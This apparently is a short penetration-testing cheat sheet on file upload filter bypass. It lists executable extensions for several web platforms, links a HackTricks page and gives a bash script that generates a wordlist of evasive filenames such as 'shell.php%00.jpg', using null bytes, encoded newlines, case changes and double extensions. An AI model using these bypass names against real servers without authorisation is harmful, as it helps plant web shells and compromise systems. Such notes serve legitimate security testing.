
Extensions
#########

- PHP: .php, .php2, .php3, .php4, .php5, .php6, .php7, .phps, .phps, .pht, .phtm, .phtml, .pgif, .shtml, .htaccess, .phar, .inc
- ASP: .asp, .aspx, .config, .ashx, .asmx, .aspq, .axd, .cshtm, .cshtml, .rem, .soap, .vbhtm, .vbhtml, .asa, .cer, .shtml
- Jsp: .jsp, .jspx, .jsw, .jsv, .jspf, .wss, .do, .action
- Coldfusion: .cfm, .cfml, .cfc, .dbm
- Flash: .swf
- Perl: .pl, .cgi
- Erlang Yaws Web Server: .yaws


https://book.hacktricks.xyz/pentesting-web/file-upload


```bash

#!/bin/bash

payload_name="shell"

for char in '%20' '%0a' '%00' '%0d0a' '/' '.\\' '.' '…' ':'; do
    for ext in '.php' '.php2' '.php3' '.php4' '.php5' '.php6' '.php7' '.phps' '.phps' '.pht' '.phtm' '.phtml' '.pgif' '.shtml' '.htaccess' '.phar' '.inc'; do
        echo "${payload_name}${ext}" >> wordlist.txt
        echo "${payload_name}${ext^^}" >> wordlist.txt
        echo "${payload_name}$(echo ${ext} | sed 's/./\U&/3')" >> wordlist.txt
        echo "${payload_name}${char}${ext}.jpg" >> wordlist.txt
        echo "${payload_name}${char}${ext^^}.jpg" >> wordlist.txt
        echo "${payload_name}${char}$(echo ${ext} | sed 's/./\U&/3').jpg" >> wordlist.txt
        echo "${payload_name}${char}${ext}.jpg" >> wordlist.txt
        echo "${payload_name}${char}${ext^^}.jpg" >> wordlist.txt
        echo "${payload_name}${char}$(echo ${ext} | sed 's/./\U&/3').jpg" >> wordlist.txt
        echo "${payload_name}${ext}${char}.jpg" >> wordlist.txt
        echo "${payload_name}${ext^^}${char}.jpg" >> wordlist.txt
        echo "${payload_name}$(echo ${ext} | sed 's/./\U&/3')${char}.jpg" >> wordlist.txt
        echo "${payload_name}.jpg${char}${ext}" >> wordlist.txt
        echo "${payload_name}.jpg${char}${ext^^}" >> wordlist.txt
        echo "${payload_name}.jpg${char}$(echo ${ext} | sed 's/./\U&/3')" >> wordlist.txt
        echo "${payload_name}.jpg${ext}${char}" >> wordlist.txt
        echo "${payload_name}.jpg${ext^^}${char}" >> wordlist.txt
        echo "${payload_name}.jpg$(echo ${ext} | sed 's/./\U&/3')${char}" >> wordlist.txt
    done
done
```
